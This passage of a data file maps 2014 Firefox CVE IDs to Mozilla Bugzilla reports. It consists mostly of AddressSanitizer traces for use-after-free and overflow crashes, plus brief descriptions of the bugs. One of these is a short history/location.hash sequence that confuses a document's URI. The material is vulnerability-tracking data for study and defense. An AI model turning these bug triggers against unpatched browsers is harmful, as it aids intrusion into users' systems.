MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:226 #15 0x7fd885b8200a in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:219 #16 0x7fd885b81ee5 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:193 #17 0x7fd883c731ec in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:258 #18 0x7fd8aadb3242 in _pt_root nsprpub/pr/src/pthreads/ptthread.c:205 #19 0x43c240 in __asan::AsanThread::ThreadStart(unsigned long) _asan_rtl_ #20 0x7fd8af67fe99 in start_thread /build/buildd/eglibc-2.15/nptl/pthread_create.c:308 #21 0x7fd8ae78e3fc in 0x60200036d473 is located 2 bytes to the right of 1-byte region [0x60200036d470,0x60200036d471) allocated by thread T63 (ImageDecoder #2) here: #0 0x434065 in malloc _asan_rtl_ #1 0x7fd889bd819c in read_icc_profile image/decoders/iccjpeg.c:163 #2 0x7fd889bf8cbf in mozilla::image::GetICCProfile(jpeg_decompress_struct&) image/decoders/nsJPEGDecoder.cpp:67 #3 0x7fd889bf4d44 in mozilla::image::nsJPEGDecoder::WriteInternal(char const*, unsigned int, mozilla::image::DecodeStrategy) image/decoders/nsJPEGDecoder.cpp:258 #4 0x7fd889b0ab64 in mozilla::image::Decoder::Write(char const*, unsigned int, mozilla::image::DecodeStrategy) image/src/Decoder.cpp:107 #5 0x7fd889ab904b in mozilla::image::RasterImage::WriteToDecoder(char const*, unsigned int, mozilla::image::DecodeStrategy) image/src/RasterImage.cpp:2148 #6 0x7fd889acb74a in mozilla::image::RasterImage::DecodeSomeData(unsigned int, mozilla::image::DecodeStrategy) image/src/RasterImage.cpp:2779 #7 0x7fd889adadb9 in mozilla::image::RasterImage::DecodePool::DecodeSomeOfImage(mozilla::image::RasterImage*, mozilla::image::DecodeStrategy, mozilla::image::RasterImage::DecodePool::DecodeType, unsigned int) image/src/RasterImage.cpp:3419 #8 0x7fd889adc477 in mozilla::image::RasterImage::DecodePool::DecodeJob::Run() image/src/RasterImage.cpp:3285 #9 0x7fd883c91475 in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:208 #10 0x7fd883c91fd4 in non-virtual thunk to nsThreadPool::Run() objdir-ff-asan-sym/xpcom/threads/Unified_cpp_xpcom_threads0.cpp:222 #11 0x7fd883c7d718 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:643 #12 0x7fd88368f442 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:263 #13 0x7fd885ebeb0d in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:303 #14 0x7fd885b823b7 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:226 #15 0x7fd885b8200a in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:219 #16 0x7fd885b81ee5 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:193 #17 0x7fd883c731ec in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:258 #18 0x7fd8aadb3242 in _pt_root nsprpub/pr/src/pthreads/ptthread.c:205 #19 0x43c240 in __asan::AsanThread::ThreadStart(unsigned long) _asan_rtl_ Thread T63 (ImageDecoder #2) created by T0 here: #0 0x414f7e in __interceptor_pthread_create _asan_rtl_ #1 0x7fd8aada4894 in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:445 #2 0x7fd8aada2c6a in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:528 #3 0x7fd883c76951 in nsThread::Init() xpcom/threads/nsThread.cpp:329 #4 0x7fd883c8995e in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) xpcom/threads/nsThreadManager.cpp:232 #5 0x7fd883c8ea5f in nsThreadPool::PutEvent(nsIRunnable*) xpcom/threads/nsThreadPool.cpp:92 #6 0x7fd883c92858 in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) xpcom/threads/nsThreadPool.cpp:246 #7 0x7fd883b86456 in nsInputStreamReadyEvent::OnInputStreamReady(nsIAsyncInputStream*) xpcom/io/nsStreamUtils.cpp:72 #8 0x7fd883b8679e in non-virtual thunk to nsInputStreamReadyEvent::OnInputStreamReady(nsIAsyncInputStream*) objdir-ff-asan-sym/xpcom/io/Unified_cpp_xpcom_io1.cpp:79 #9 0x7fd883b07456 in nsPipeEvents::~nsPipeEvents() xpcom/io/nsPipe3.cpp:592 #10 0x7fd883b0fdf1 in nsPipeInputStream::AsyncWait(nsIInputStreamCallback*, unsigned int, unsigned int, nsIEventTarget*) xpcom/io/nsPipe3.cpp:854 #11 0x7fd8842a78ae in nsInputStreamPump::EnsureWaiting() netwerk/base/src/nsInputStreamPump.cpp:142 #12 0x7fd8842afde1 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) netwerk/base/src/nsInputStreamPump.cpp:475 #13 0x7fd8842b37ae in non-virtual thunk to nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) objdir-ff-asan-sym/netwerk/base/src/Unified_cpp_netwerk_base_src1.cpp:490 #14 0x7fd883b861a8 in nsInputStreamReadyEvent::Run() xpcom/io/nsStreamUtils.cpp:85 #15 0x7fd883c7d718 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:643 #16 0x7fd88368f442 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:263 #17 0x7fd885eba818 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:95 #18 0x7fd885b823b7 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:226 #19 0x7fd885b8200a in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:219 #20 0x7fd885b81ee5 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:193 #21 0x7fd88ea2463f in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:161 #22 0x7fd8992b6319 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:276 #23 0x7fd898af4c65 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:4090 #24 0x7fd898af950a in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:4158 #25 0x7fd898afbed4 in XRE_main toolkit/xre/nsAppRunner.cpp:4368 #26 0x44dc07 in do_main(int, char**, nsIFile*) browser/app/nsBrowserApp.cpp:280 #27 0x44abe5 in main browser/app/nsBrowserApp.cpp:648 #28 0x7fd8ae6bb76c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226 Shadow bytes around the buggy address: 0x0c0480065a30: fa fa fd fd fa fa fd fa fa fa 00 00 fa fa 00 fa 0x0c0480065a40: fa fa 00 00 fa fa fd fa fa fa 00 00 fa fa 00 fa 0x0c0480065a50: fa fa 00 00 fa fa fd fa fa fa 00 00 fa fa 00 fa 0x0c0480065a60: fa fa 00 00 fa fa fd fd fa fa fd fa fa fa 00 00 0x0c0480065a70: fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 00 fa =>0x0c0480065a80: fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa[01]fa 0x0c0480065a90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480065aa0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480065ab0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480065ac0: fa fa fd fa fa fa 00 02 fa fa 00 00 fa fa 00 fa 0x0c0480065ad0: fa fa fd fa fa fa 00 00 fa fa 00 04 fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==7222==ABORTING"
      }
    ],
    "CVE-2014-1525": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=989210",
        "title": "Heap-use-after-free in mozilla::dom::TextTrack::AddCue",
        "description": "Run test.html from archive. Load it over http and firefox with fuzzPriv extensions. Testcase has some flakiness, looks like some timing factor is involved with vtt file load. >==22711==ERROR: AddressSanitizer: heap-use-after-free on address 0x6160001fd678 at pc 0x7f33ab37c6dd bp 0x7fff4f7478c0 sp 0x7fff4f7478b8 >READ of size 8 at 0x6160001fd678 thread T0 > #0 0x7f33ab37c6dc in get objdir-ff-asan/content/media/../../dist/include/nsAutoPtr.h:1039 > #1 0x7f33ab37c6dc in operator mozilla::dom::TextTrackManager * objdir-ff-asan/content/media/../../dist/include/nsAutoPtr.h:1052 > #2 0x7f33ab37c6dc in AddCue objdir-ff-asan/content/media/../../dist/include/mozilla/dom/HTMLMediaElement.h:538 > #3 0x7f33ab37c6dc in mozilla::dom::TextTrack::AddCue(mozilla::dom::TextTrackCue&) content/media/TextTrack.cpp:115 > #4 0x7f33ab39d67d in mozilla::dom::WebVTTListener::OnCue(JS::Handle<JS::Value>, JSContext*) content/media/WebVTTListener.cpp:169 > #5 0x7f33a77e9921 in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 > #6 0x7f33aa24f1d7 in Invoke js/xpconnect/src/XPCWrappedNative.cpp:2407 > #7 0x7f33aa24f1d7 in CallMethodHelper js/xpconnect/src/XPCWrappedNative.cpp:1748 > #8 0x7f33aa24f1d7 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:1715 > #9 0x7f33aa25523e in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1282 > #10 0x7f33aeab6ab1 in CallJSNative js/src/jscntxtinlines.h:239 > #11 0x7f33aeab6ab1 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:469 > #12 0x7f33aeab80ae in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:532 > #13 0x7f33ae897244 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:465 > #14 0x7f33ae9cdf86 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jswrapper.cpp:465 > #15 0x7f33ae8b9a65 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:2637 > #16 0x7f33ae8bf5f4 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/jsproxy.cpp:3040 > #17 0x7f33aeab6ab1 in CallJSNative js/src/jscntxtinlines.h:239 > #18 0x7f33aeab6ab1 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:469 > #19 0x7f33aeaa95da in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2614 > #20 0x7f33aea8db39 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:423 > #21 0x7f33aeab6fff in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:495 > #22 0x7f33aeab80ae in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:532 > #23 0x7f33ae897244 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:465 > #24 0x7f33ae9cdf86 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jswrapper.cpp:465 > #25 0x7f33ae8b9a65 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:2637 > #26 0x7f33ae8bf5f4 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/jsproxy.cpp:3040 > #27 0x7f33aeab6ab1 in CallJSNative js/src/jscntxtinlines.h:239 > #28 0x7f33aeab6ab1 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:469 > #29 0x7f33aeab80ae in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:532 > #30 0x7f33ae2cc585 in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICCall_Fallback*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) js/src/jit/BaselineIC.cpp:8235 > >0x6160001fd678 is located 504 bytes inside of 528-byte region [0x6160001fd480,0x6160001fd690) >freed by thread T0 here: > #0 0x473b81 in __interceptor_free _asan_rtl_ > #1 0x7f33a76eb73b in SnowWhiteKiller::~SnowWhiteKiller() xpcom/base/nsCycleCollector.cpp:2352 > #2 0x7f33a76eb339 in nsCycleCollector::FreeSnowWhite(bool) xpcom/base/nsCycleCollector.cpp:2516 > #3 0x7f33a76f1115 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3392 > #4 0x7f33a76f07f6 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3254 > #5 0x7f33a76f43a3 in nsCycleCollector_collect(nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3807 > #6 0x7f33aa50ee96 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) dom/base/nsJSEnvironment.cpp:1949 > #7 0x7f33aa50e590 in nsJSEnvironmentObserver::Observe(nsISupports*, char const*, char16_t const*) dom/base/nsJSEnvironment.cpp:277 > #8 0x7f33a773664c in NotifyObservers xpcom/ds/nsObserverList.cpp:96 > #9 0x7f33a773664c in nsObserverService::NotifyObservers(nsISupports*, char const*, char16_t const*) xpcom/ds/nsObserverService.cpp:302 > #10 0x7f33a77e9921 in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 > #11 0x7f33aa24f1d7 in Invoke js/xpconnect/src/XPCWrappedNative.cpp:2407 > #12 0x7f33aa24f1d7 in CallMethodHelper js/xpconnect/src/XPCWrappedNative.cpp:1748 > #13 0x7f33aa24f1d7 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:1715 > #14 0x7f33aa25523e in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1282 > #15 0x7f33aeab6ab1 in CallJSNative js/src/jscntxtinlines.h:239 > #16 0x7f33aeab6ab1 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:469 > #17 0x7f33aeaa95da in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2614 > #18 0x7f33aea8db39 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:423 > #19 0x7f33aeab6fff in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:495 > #20 0x7f33ae76f167 in js::CallOrConstructBoundFunction(JSContext*, unsigned int, JS::Value*) js/src/jsfun.cpp:1282 > #21 0x7f33aeab6ab1 in CallJSNative js/src/jscntxtinlines.h:239 > #22 0x7f33aeab6ab1 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:469 > #23 0x7f33aeab80ae in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:532 > #24 0x7f33ae897244 in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:465 > #25 0x7f33ae9cdf86 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jswrapper.cpp:465 > #26 0x7f33ae8b9a65 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:2637 > #27 0x7f33ae8bf5f4 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/jsproxy.cpp:3040 > #28 0x7f33aeab6ab1 in CallJSNative js/src/jscntxtinlines.h:239 > #29 0x7f33aeab6ab1 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:469 > #30 0x7f33aeaa95da in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2614 > #31 0x7f33aea8db39 in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:423 > #32 0x7f33aeab99eb in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::AbstractFramePtr, JS::Value*) js/src/vm/Interpreter.cpp:631 > #33 0x7f33aeab9f8e in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/vm/Interpreter.cpp:667 > #34 0x7f33ae71bc86 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::ReadOnlyCompileOptions const&, char16_t const*, unsigned long, JS::Value*) js/src/jsapi.cpp:4779 > #35 0x7f33aa5e0a1a in nsJSUtils::EvaluateString(JSContext*, nsAString_internal const&, JS::Handle<JSObject*>, JS::CompileOptions&, nsJSUtils::EvaluateOptions&, JS::Value*, void**) dom/base/nsJSUtils.cpp:223 > >previously allocated by thread T0 here: > #0 0x473d81 in malloc _asan_rtl_ > #1 0x7f33b1eb2a7d in moz_xmalloc memory/mozalloc/mozalloc.cpp:52 > #2 0x7f33ab216ce6 in operator new objdir-ff-asan/content/html/content/src/../../../../dist/include/mozilla/mozalloc.h:201 > #3 0x7f33ab216ce6 in NS_NewHTMLVideoElement(already_AddRefed<nsINodeInfo>&&, mozilla::dom::FromParser) content/html/content/src/HTMLVideoElement.cpp:37 > #4 0x7f33ab2998f7 in CreateHTMLElement content/html/document/src/nsHTMLContentSink.cpp:303 > #5 0x7f33ab2998f7 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<nsINodeInfo>&&, mozilla::dom::FromParser) content/html/document/src/nsHTMLContentSink.cpp:284 > #6 0x7f33aaf1ba60 in NS_NewElement(mozilla::dom::Element**, already_AddRefed<nsINodeInfo>&&, mozilla::dom::FromParser) content/base/src/nsNameSpaceManager.cpp:146 > #7 0x7f33aa3f2dc0 in nsHtml5TreeOperation::CreateElement(int, nsIAtom*, nsHtml5HtmlAttributes*, mozilla::dom::FromParser, nsHtml5DocumentBuilder*) parser/html/nsHtml5TreeOperation.cpp:359 > #8 0x7f33aa3ffadf in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) parser/html/nsHtml5TreeOperation.cpp:685 > #9 0x7f33aa3fac19 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:439 > #10 0x7f33aa40824b in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:128 > #11 0x7f33a77d64e0 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:694 > #12 0x7f33a76a1d5a in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:263 > #13 0x7f33a7f99159 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:95 > #14 0x7f33a7f42130 in RunInternal ipc/chromium/src/base/message_loop.cc:226 > #15 0x7f33a7f42130 in RunHandler ipc/chromium/src/base/message_loop.cc:219 > #16 0x7f33a7f42130 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:193 > #17 0x7f33aa0af447 in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:164 > #18 0x7f33acec5cb8 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:276 > #19 0x7f33acd351a3 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:4019 > #20 0x7f33acd3608d in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:4088 > #21 0x7f33acd36edd in XRE_main toolkit/xre/nsAppRunner.cpp:4300 > #22 0x48c6e7 in do_main browser/app/nsBrowserApp.cpp:282 > #23 0x48c6e7 in main browser/app/nsBrowserApp.cpp:643 > #24 0x7f33b5d3b76c in __libc_start_main /build/buildd/eglibc-2.15/csu/libc-start.c:226 > >SUMMARY: AddressSanitizer: heap-use-after-free ??:0 ?? >Shadow bytes around the buggy address: > 0x0c2c80037a70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd > 0x0c2c80037a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c2c80037a90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd > 0x0c2c80037aa0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd > 0x0c2c80037ab0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd >=>0x0c2c80037ac0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd[fd] > 0x0c2c80037ad0: fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c2c80037ae0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c2c80037af0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd > 0x0c2c80037b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd > 0x0c2c80037b10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd >Shadow byte legend (one shadow byte represents 8 application bytes): > Addressable: 00 > Partially addressable: 01 02 03 04 05 06 07 > Heap left redzone: fa > Heap right redzone: fb > Freed heap region: fd > Stack left redzone: f1 > Stack mid redzone: f2 > Stack right redzone: f3 > Stack partial redzone: f4 > Stack after return: f5 > Stack use after scope: f8 > Global redzone: f9 > Global init order: f6 > Poisoned by user: f7 > Contiguous container OOB:fc > ASan internal: fe >==22711==ABORTING > >"
      }
    ],
    "CVE-2014-1526": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=988106",
        "title": "Debugger unwraps window Xrays, then tries to call DOM methods on the result",
        "description": "ccing people who seem to have review/code blame for the relevant bits over time... In toolkit/devtools/server/actors/script.js we have this bit: 451 this.global = this.globalSafe = aGlobal; 452 if (aGlobal && aGlobal.wrappedJSObject) { 453 this.global = aGlobal.wrappedJSObject; 454 } and then various now-unsafe uses of this.global (ones where the page can just control what the methods return; I've included the ones where it's obvious that this.global flows into the expression): 1746 let nodes = this.global.document.getElementsByTagName(\"*\"); ... 1764 let selector = node.tagName ? findCssSelector(node) : \"window\"; ... 1774 listenerForm.isEventHandler = !!node[\"on\" + listenerForm.type]; ... and most importantly for purposes of bug 789261: 5385 function getInnerId(window) { 5386 return window.QueryInterface(Ci.nsIInterfaceRequestor). 5387 getInterface(Ci.nsIDOMWindowUtils).currentInnerWindowID; 5388 }; Why exactly are we working with the unwrapped object here? The blame for the .wrappedJSObject bit goes back a ways; I tracked it to at least http://hg.mozilla.org/mozilla-central/rev/81e2e423fc63 Bug 901930 added the globalSafe bit, but only used it for toString, not all the other places this code is poking at. For the other uses above, they all seem to date back to <http://hg.mozilla.org/mozilla-central/rev/5d860e628af6>, so at least ESR24 is not affected, but every other branch we have is, in case people feel this needs backporting. How much of a security problem this is in practice is hard to tell, of course. My gut instinct here is to just nix globalSafe and drop the .wrappedJSObject thing completely, but is there a _reason_ we want the non-Xray window here, exactly?"
      }
    ],
    "CVE-2014-1528": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=963962",
        "title": "crash in sse2_composite_src_x888_8888",
        "description": "1. Visit https://dl.dropboxusercontent.com/u/40949268/emcc/bugs/Tests_d_crashes/Tests_d.html Observed: Web page crashes to desktop. See traces https://crash-stats.mozilla.com/report/index/2f8f3cc4-f715-4961-835c-190282140125 https://crash-stats.mozilla.com/report/index/67e3f68d-8e07-4aa3-8f2d-171622140125 Reproduced on newest Macbook Pro line laptop running Windows 8.1 in bootcamp. Did not reproduce on a two year old Macbook Air line laptop running Windows 7 in bootcamp."
      }
    ],
    "CVE-2014-1529": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=987003",
        "title": "Arbitrary code execution from web notifications",
        "description": "There's no security check for the icon URL in notifications -- as a result, pages with the notification permission can run arbitrary code. Websites with no such privilege can try clickjacking, especially that there's no security delay on the notification prompt."
      }
    ],
    "CVE-2014-1530": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=895557",
        "title": "It's possible to set a document's URI to a different document's URI by confusing docshell",
        "description": "Bug 803870 was fixed by disallowing cross-origin history access, but the key problem is not fixed and it is still abusable with subframe. the problem is: history.forward(); // A location.hash='a'; // B 1) A sets mLSHE to a SHEntry to be loaded. 2) B sets mLSHE to null and sets mOSHE to a new SHEntry. 3) the history load is processed, but nsDocShell::Embed does not update mOSHE since mLSHE is null."
      }
    ],
    "CVE-2014-1531": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=987140",
        "title": "ASAN heap-use-after-free in nsGenericHTMLElement::GetWidthHeightForImage",
        "description": "The attached test case crashes the latest ASAN build of Firefox. ASAN output attached in crash.txt. The imgLoader object is freed while setting a new src in the onresize event handler."
      }
    ],
    "CVE-2014-1532": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=966006",
        "title": "heap-use-after-free in libxul.so!nsHostResolver::ConditionallyRefreshRecord()",
        "description": "Found by the BlackBerry Security Automated Analysis Team's fuzzing framework ALF. At this time we do not have a test case that will reproduce the issue. ==14607==ERROR: AddressSanitizer: heap-use-after-free on address 0x603001988ce0 at pc 0x7fb8e190676a bp 0x7fff84db1080 sp 0x7fff84db1078 READ of size 4 at 0x603001988ce0 thread T0 #0 0x7fb8e1906769 (libxul.so!nsHostResolver::ConditionallyRefreshRecord(nsHostRecord*, char const*)+0x1a9) Line 368 of \"../../dist/include/nsTArray.h\" #1 0x7fb8e190533d (libxul.so!nsHostResolver::ResolveHost(char const*, unsigned short, unsigned short, nsResolveHostCallback*)+0xd2d) Line 634 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/dns/nsHostResolver.cpp\" #2 0x7fb8e1917874 (libxul.so!nsDNSService::AsyncResolve(nsACString_internal const&, unsigned int, nsIDNSListener*, nsIEventTarget*, nsICancelable**)+0xb44) Line 675 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/dns/nsDNSService2.cpp\" #3 0x7fb8e182cc9d (libxul.so!nsDNSPrefetch::Prefetch(unsigned short)+0x1dd) Line 64 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsDNSPrefetch.cpp\" #4 0x7fb8e1ae05bf (libxul.so!mozilla::net::nsHttpChannel::BeginConnect()+0x104f) Line 4540 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nsHttpChannel.cpp\" #5 0x7fb8e1ae15be (libxul.so!mozilla::net::nsHttpChannel::OnProxyAvailable(nsICancelable*, nsIURI*, nsIProxyInfo*, tag_nsresult)+0x10e) Line 4650 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nsHttpChannel.cpp\" #6 0x7fb8e18b2a25 (libxul.so!nsAsyncResolveRequest::DoCallback()+0x9a5) Line 238 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsProtocolProxyService.cpp\" #7 0x7fb8e1878251 (libxul.so!nsProtocolProxyService::AsyncResolveInternal(nsIURI*, unsigned int, nsIProtocolProxyCallback*, nsICancelable**, bool)+0x8a1) Line 130 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsProtocolProxyService.cpp\" #8 0x7fb8e1ad03d9 (libxul.so!mozilla::net::nsHttpChannel::ResolveProxy()+0x2f9) Line 1776 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nsHttpChannel.cpp\" #9 0x7fb8e1adf3ea (libxul.so!mozilla::net::nsHttpChannel::AsyncOpen(nsIStreamListener*, nsISupports*)+0x5ea) Line 4444 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nsHttpChannel.cpp\" #10 0x7fb8e4ea2a59 (libxul.so!mozilla::dom::HTMLTrackElement::LoadResource()+0xad9) Line 247 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/html/content/src/HTMLTrackElement.cpp\" #11 0x7fb8e4ea858c (libxul.so!nsRunnableMethodImpl<void (mozilla::dom::HTMLTrackElement::*)(), void, true>::Run()+0x6c) Line 383 of \"../../../../dist/include/nsThreadUtils.h\" #12 0x7fb8e4e36415 (libxul.so!mozilla::dom::nsSyncSection::Run()+0xa5) Line 693 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/content/html/content/src/HTMLMediaElement.cpp\" #13 0x7fb8e4007dc8 (libxul.so!nsBaseAppShell::RunSyncSectionsInternal(bool, unsigned int)+0x228) Line 349 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp\" #14 0x7fb8e40085d8 (libxul.so!non-virtual thunk to nsBaseAppShell::AfterProcessNextEvent(nsIThreadInternal*, unsigned int, bool)+0x48) Line 90 of 